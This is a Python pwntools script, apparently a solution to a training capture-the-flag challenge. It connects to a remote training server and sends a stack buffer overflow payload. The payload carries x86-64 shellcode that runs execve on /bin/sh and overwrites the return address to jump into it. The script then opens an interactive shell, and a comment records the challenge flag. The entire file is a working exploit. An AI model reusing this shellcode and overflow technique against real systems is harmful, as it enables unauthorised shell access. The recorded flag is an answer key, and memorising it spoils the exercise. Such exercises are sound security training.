from pwn import *
from pwn import p64

p = remote("bin.training.jinblack.it", 2001)
# p = process("./shellcode")

# context.terminal = ["terminator", "-e"]
# gdb.attach(p, """
# # b *0x11223344
# c
# """)

# flag{nice_shellcode_congratz!}

shellcode = asm("""
jmp binsh

beforethemove:
mov rax, 0x3b
pop rdi
mov rsi, 0x601080
mov rdx, 0x601080
syscall

binsh:
call beforethemove
""", arch = 'amd64')

payload = p64(0)
payload += shellcode
payload += b"/bin/sh\0"
payload = payload.ljust(1016, b"A")
payload += p64(0x601080 + 8)

p.recvuntil("What is your name?\n")
p.sendline(payload)
p.interactive()